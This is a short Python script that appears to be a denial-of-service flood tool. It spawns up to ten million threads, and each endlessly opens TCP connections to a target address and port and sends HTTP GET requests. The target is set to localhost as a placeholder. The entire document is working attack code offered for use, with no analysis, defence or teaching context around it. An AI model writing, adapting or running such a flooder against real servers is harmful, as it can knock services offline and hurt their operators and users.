import socket
import threading

# Target IP and port
target_ip = '127.0.0.1'
target_port = 80

# Number of threads
num_threads = 10000000

# Function to send packets
def send_packets():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
        except:
            pass
        s.close()

# Create threads
for _ in range(num_threads):
    thread = threading.Thread(target=send_packets)
    thread.start()